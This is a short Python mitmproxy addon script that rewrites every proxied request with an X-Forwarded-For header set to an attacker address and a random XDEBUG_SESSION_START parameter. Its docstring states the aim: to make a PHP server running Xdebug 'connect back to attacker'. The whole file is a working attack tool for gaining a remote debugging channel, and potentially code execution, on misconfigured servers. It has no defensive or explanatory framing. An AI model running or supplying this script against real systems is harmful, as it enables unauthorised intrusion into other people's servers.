from random import choice
from string import ascii_letters
import argparse

from mitmproxy import http, ctx

def rand_id(n=6):
  r = ''
  for i in range(n):
    r += choice(ascii_letters)
  return r

class XdebugActivator:
  '''Define a request method that adds X-Forwarded-For header and XDEBUG_SESSION_START parameter.
This shall activate xdebug and requires it to connect back to attacker.'''
  def __init__(self, connect_to):
    self.connect_to = connect_to

  def request(self, flow):
    flow.request.headers['X-Forwarded-For'] = self.connect_to
    flow.request.query['XDEBUG_SESSION_START'] = rand_id()

def start():
  parser = argparse.ArgumentParser()
  parser.add_argument('connect_to', type=str)
  args = parser.parse_args()
  return XdebugActivator(args.connect_to)
